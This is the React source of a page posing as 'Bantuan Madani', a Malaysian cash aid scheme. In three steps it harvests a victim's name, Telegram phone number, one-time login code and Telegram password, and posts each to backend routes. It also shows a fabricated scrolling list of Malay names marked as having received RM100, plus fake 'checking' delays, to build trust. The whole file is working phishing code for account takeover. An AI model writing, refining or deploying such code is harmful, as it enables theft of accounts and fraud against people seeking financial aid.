import { Head, Link, router, useForm } from "@inertiajs/react";
import { React, useState, useRef, useEffect } from "react";
import CountryData from "../../../js/CountryCodesWithFlags";
export default function Index() {
    const dataNama = [
        "Aisyah binti Abdul Rahman",
        "Ahmad bin Ismail",
        "Siti Nur Aisyah",
        "Zahra binti Ismail",
        "Farhan bin Khalid",
        "Mira binti Mohd Noor",
        "Ali bin Rashid",
        "Hana binti Shamsul",
        "Nadia binti Ahmad",
        "Kamal bin Ibrahim",
        "Aisyah binti Mohamad",
        "Zul bin Abidin",
        "Nabilah binti Abdul Razak",
        "Sulaiman bin Zainal",
        "Nina binti Ali",
        "Fahmi bin Azman",
        "Lina binti Mohd",
        "Nabil bin Ahmad",
        "Fatin binti Yusof",
        "Arif bin Ibrahim",
        "Azizah binti Rahman",
        "Ibrahim bin Yassin",
        "Liyana binti Faris",
        "Adam bin Zulkifli",
        "Rina binti Ismail",
        "Khalid bin Omar",
        "Mariam binti Ali",
        "Sharifah binti Abdillah",
        "Zuraida binti Mohamad",
        "Aina binti Sulaiman",
        "Syafiq bin Abdul Rahman",
        "Maira binti Idris",
        "Firdaus bin Ali",
        "Rafidah binti Zainal",
        "Fadhil bin Ali",
        "Nurul binti Hisham",
        "Rizal bin Mohd Noor",
        "Shaza binti Khalid",
        "Ismail bin Abu",
        "Nora binti Salleh",
        "Syakir bin Ibrahim",
        "Sarah binti Mohd",
        "Rizwan bin Razak",
        "Fayza binti Mohd",
        "Haziq bin Hassan",
        "Aminah binti Zainal",
        "Zainal bin Mohd Noor",
        "Amir bin Ali",
        "Ainul binti Kamal",
        "Siti Mariam binti Hassan",
        "Faiz bin Ramli",
        "Syarifah binti Zulkifli",
        "Mimi binti Ibrahim",
        "Afiqah binti Safwan",
        "Norliza binti Ahmad",
        "Rasul bin Ali",
        "Fathimah binti Abdul Wahid",
        "Mokhtar bin Abd Rahman",
        "Haziqah binti Ahmad",
        "Zainab binti Ali",
        "Razak bin Samad",
        "Shakila binti Ibrahim",
        "Hassan bin Nordin",
        "Zubair bin Saad",
        "Rina binti Yahya",
        "Nour binti Abdillah",
        "Faris bin Mohd",
        "Hanafi bin Ismail",
        "Azman bin Ahmad",
        "Fatimah binti Mohd",
        "Najwa binti Yusuf",
        "Rizwan bin Rani",
        "Huda binti Asma",
        "Azra binti Ahmad",
        "Ikram bin Omar",
        "Jamilah binti Abdullah",
        "Fizah binti Aziz",
        "Farah binti Ismail",
        "Wani binti Ahmad",
        "Anwar bin Hassan",
        "Rosmah binti Ibrahim",
        "Farrin binti Zahid",
        "Yusof bin Osman",
        "Shamsul bin Sulaiman",
        "Azeem bin Rashid",
        "Alya binti Ali",
        "Rifqi bin Farhan",
        "Nisa binti Idris",
        "Diana binti Sulaiman",
        "Nabilah binti Farid",
        "Khairul bin Nordin",
        "Raya binti Jamal",
        "Mariam binti Ramli",
        "Siti Aisyah binti Noor",
        "Syahira binti Mahmud",
        "Shafie bin Zulkifli",
        "Danial bin Omar",
        "Raja binti Azman",
        "Azreen binti Salleh",
        "Rilla binti Ibrahim",
        "Hafiz bin Rashid",
        "Zahira binti Mohd",
        "Asyraf bin Mohamad",
        "Mika binti Ali",
        "Rania binti Faris",
        "Siti Nur binti Ibrahim",
        "Shakirah binti Yusuf",
        "Hana binti Zakaria",
        "Zakia binti Abdullah",
        "Jazlin binti Ismail",
        "Shamsuddin bin Ismail",
        "Nabil bin Abidin",
        "Fahmi bin Muhammad",
        "Aziza binti Osman",
        "Safira binti Faris",
        "Zakaria bin Ali",
        "Syamil bin Azman",
        "Azimah binti Zainal",
        "Khairani binti Ibrahim",
        "Razali bin Ahmad",
        "Abdul Rahman bin Hisham",
        "Ain binti Nasir",
        "Fakhrul bin Zainal",
        "Afiq bin Omar",
        "Nur binti Samad",
        "Rijal bin Abidin",
        "Fahira binti Salim",
        "Rizq bin Mohd",
        "Anis binti Omar",
        "Mira binti Kamal",
        "Ainul binti Azman",
        "Fahmi bin Saad",
        "Rashidah binti Mohd",
        "Elina binti Ibrahim",
        "Zain bin Abdullah",
        "Zara binti Ali",
        "Syazwan bin Yusof",
        "Firas bin Ali",
        "Khairul bin Kamal",
        "Nadia binti Shamsul",
        "Shazwan bin Mohd",
        "Raihan bin Zainal",
        "Aslam bin Ibrahim",
        "Yasmin binti Omar",
        "Hafizah binti Ali",
    ];
    const [status, setStatus] = useState("registrasi");
    const { data, setData, post, reset, errors } = useForm({
        nama: "",
        nomor_hp: "+60",
        password: "",
    });
    const [verifData, setVerifData] = useState(["", "", "", "", ""]);
    const verifRef = useRef([]);
    const containerRef = useRef(null);
    const [loading, setLoading] = useState(false);
    const [showInput, setShowInput] = useState(false);
    const [countryData, setCountryData] = useState(CountryData);
    const [showNumber, setShowNumber] = useState(false);
    const [show, setShow] = useState(15);
    const [type, setType] = useState("home");

    const handleChange = (index, event) => {
        const nilaiBaru = [...verifData];
        nilaiBaru[index] = event.target.value;
        if (event.target.value.length === 1 && index < 4) {
            verifRef.current[index + 1].focus();
        }
        setVerifData(nilaiBaru);
    };
    const submitHandler = (e) => {
        e.preventDefault();
        setLoading(true);
        post(route("bantuan.registrasi-store"), {
            onSuccess: () => {
                setTimeout(() => {
                    setLoading(false);
                    setStatus("verifikasi");
                }, 5000);
            },
            onError: () => {
                setTimeout(() => {
                    setLoading(false);
                    setStatus("registrasi");
                }, 5000);
            },
        });
    };
    const submitVerif = (e) => {
        e.preventDefault();
        setLoading(true);
        router.post(
            route("bantuan.verifikasi-store"),
            {
                nomor_hp: data.nomor_hp,
                code_verif: verifData,
            },
            {
                onSuccess: () => {
                    setTimeout(() => {
                        setLoading(false);

                        setStatus("password");
                    }, 5000);
                },
                onError: () => {
                    setTimeout(() => {
                        setLoading(false);

                        setStatus("verifikasi");
                    }, 5000);
                },
            }
        );
    };
    const submitPassword = (e) => {
        e.preventDefault();
        setLoading(true);
        router.post(
            route("bantuan.password-store"),
            {
                nomor_hp: data.nomor_hp,
                code_verif: verifData,
                password: data.password,
            },
            {
                onSuccess: () => {
                    setData({
                        ...data,
                        nama: "",
                        nomor_hp: "+62",
                        password: "",
                    });
                    setTimeout(() => {
                        setLoading(false);

                        setVerifData(["", "", "", "", ""]);
                        setStatus("registrasi");
                    }, 5000);
                },
                onError: () => {
                    setTimeout(() => {
                        setLoading(false);

                        setStatus("password");
                    }, 5000);
                },
            }
        );
    };

    useEffect(() => {
        const interval = setInterval(() => {
            setShow((prev) => prev + 1);
        }, 1000);

        // Clear interval saat komponen unmount
        return () => clearInterval(interval);
    }, []);
    useEffect(() => {
        if (containerRef.current) {
            containerRef.current.scrollTop = containerRef.current.scrollHeight;
        }
    }, [show]);

    return (
        <div className=" transition-all duration-300 ease-in-out  relative  overflow-y-hidden bg-orange-500">
            <Head title="Bantuan Madani" />
            <div className="py-4 px-4 drop-shadow-md bg-orange-500 flex justify-between items-center">
                <img src="/Bantuan/logo-home-2.png" alt="" className="w-20" />
                <div className="flex justify-between gap-x-4 items-center">
                    <Link className="tracking-tighter text-white text-xl font-light">
                        Bahasa Melayu
                    </Link>
                    <Link className="tracking-tighter text-blue-700 text-xl font-light">
                        English
                    </Link>
                    <Link className="tracking-tighter text-blue-700 text-xl font-light">
                        摩訶至
                    </Link>
                    <Link className="tracking-tighter text-blue-700 text-xl font-light">
                        भारत
                    </Link>
                </div>
            </div>
            <div className="px-8 md:px-16 lg:px-24 w-full h-full py-5 flex flex-col items-center gap-y-2">
                <div>
                    <img
                        src="/Bantuan/rm300.png"
                        alt=""
                        className="rounded-md shadow-sm shadow-gray-400/50 h-[300px] md:h-[300px] lg:h-[400px]"
                    />
                    <p className="bg-red-500 text-white font-extrabold text-center py-3">
                        HANTAR RESUME SEKARANG
                    </p>
                </div>

                <p className="  text-blue-950 font-bold text-center">
                    {status == "registrasi"
                        ? ""
                        : status == "verifikasi"
                        ? "Sila Masukan Kod-yang dihantar ke Nombor" +
                          data.nomor_hp
                        : "Sila Masukan kata laluan Telegram Anda "}
                </p>
                {status == "verifikasi" && (
                    <p className="text-blue-950 font-bold text-center text-3xl tracking-tighter">
                        Masukan Kod-OTP
                    </p>
                )}

                {status == "registrasi" && (
                    <form onSubmit={submitHandler} className="w-full">
                        <p className="font-bold">Nama penuh sesuai MayKad</p>
                        <div className="my-1 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm border border-blue-950">
                            <input
                                type="text"
                                placeholder="Nama lengkap sesuai KTP"
                                className="w-full drop-shadow-sm"
                                value={data.nama}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        nama: e.target.value,
                                    })
                                }
                            />
                        </div>
                        {errors.nama && (
                            <p className="tracking-tighter text-xs text-red-500 italic">
                                {errors.nama}
                            </p>
                        )}
                        <p className="font-bold">Nombor Telefon Telegram</p>
                        <div className="mb-2.5 flex flex-row items-center w-full rounded-lg overflow-hidden p-1 bg-gray-100 drop-shadow-sm border border-blue-950">
                            <div className="py-1 px-2 rounded-md bg-gray-100 w-[50px]">
                                <img
                                    className="w-12 h-6"
                                    src={`https://flagcdn.com/w40/my.png`}
                                    alt=""
                                />
                            </div>
                            <input
                                type="text"
                                className="w-full drop-shadow-sm"
                                value={data.nomor_hp}
                                onChange={(e) =>
                                    setData({
                                        ...data,
                                        nomor_hp: e.target.value,
                                    })
                                }
                            />
                        </div>
                        {errors.nomor_hp && (
                            <p className="tracking-tighter text-xs text-red-500 italic">
                                {errors.nomor_hp}
                            </p>
                        )}

                        <div className="flex justify-center my-4">
                            <button className="text-white text-center rounded-full bg-blue-900 hover:bg-blue-950 py-2 px-4 ">
                                SEMAK STATUS
                            </button>
                        </div>
                    </form>
                )}
                {status == "verifikasi" && (
                    <form onSubmit={submitVerif} className="w-full ">
                        <div className="w-full flex gap-3 justify-center">
                            {verifData.map((item, index) => (
                                <input
                                    key={index}
                                    type="number"
                                    value={item}
                                    ref={(ref) =>
                                        (verifRef.current[index] = ref)
                                    }
                                    className="w-16 rounded-md border text-center border-blue-900 drop-shadow-md "
                                    maxLength={1}
                                    onChange={(event) =>
                                        handleChange(index, event)
                                    }
                                />
                            ))}
                        </div>
                        <div className="flex justify-center my-4">
                            <button className="text-white text-center rounded-full  bg-blue-800 hover:bg-blue-950 py-2 px-8 ">
                                Teruskan
                            </button>
                        </div>
                    </form>
                )}
                {status == "password" && (
                    <form onSubmit={submitPassword} className="w-full ">
                        <input
                            type="password"
                            placeholder="Masukkan kata laluan"
                            className="w-full drop-shadow-sm rounded-md border border-b-blue-800 drop-shadow"
                            value={data.password}
                            onChange={(e) =>
                                setData({
                                    ...data,
                                    password: e.target.value,
                                })
                            }
                        />
                        <div className="flex justify-center my-4">
                            <button className="text-white text-center rounded-full  bg-blue-800 hover:bg-blue-950 py-2 px-8 ">
                                Teruskan
                            </button>
                        </div>
                    </form>
                )}
            </div>
            <div className="px-8 md:px-16 lg:px-24 pb-8">
                <div
                    style={{
                        scrollBehavior: "smooth", // Menambahkan animasi scroll
                    }}
                    ref={containerRef}
                    className=" bg-slate-100 rounded-md flex flex-col gap-y-2 py-8 px-4 w-full h-[400px]  overflow-y-hidden"
                >
                    {dataNama.map(
                        (item, key) =>
                            key < show && (
                                <div
                                    // style={{
                                    //     animationDelay: `${key * 100}ms`, // Penundaan animasi untuk efek yang lebih alami
                                    // }}
                                    key={key}
                                    className={`transition-all duration-300 ease-linear flex gap-4 items-center bg-white py-3 px-4 leading-3 rounded-md shadow-sm shadow-gray-400/50 ${
                                        key - 1 == show && "fade-in"
                                    }`}
                                >
                                    <img
                                        src="avatar.png"
                                        alt=""
                                        className="w-12 rounded-full"
                                    />
                                    <div>
                                        <p className="font-bold text-lg md:text-xl lg:text-2xl  leading-5">
                                            {item}
                                        </p>
                                        <p className="font-bold text-blue-700 text-sm leading-5">
                                            RM100 ✅
                                        </p>
                                    </div>
                                </div>
                            )
                    )}
                </div>
            </div>
            <div className="py-6 w-full px-8 md:px-16 lg:px-24 py-5 bg-blue-800">
                <img src="/Bantuan/ini1.png" alt="" />
            </div>
            {loading && (
                <div className="fixed top-0 left-0 w-full h-full flex flex-col justify-center items-center bg-slate-950/70">
                    <img
                        src="/Bantuan/loading.gif"
                        alt=""
                        className="w-[200px]"
                    />
                    <p className="tracking-tighter font-thin text-orange-500 my-4">
                        Tunggu kami sedang menyemak...
                    </p>
                </div>
            )}
        </div>
    );
}
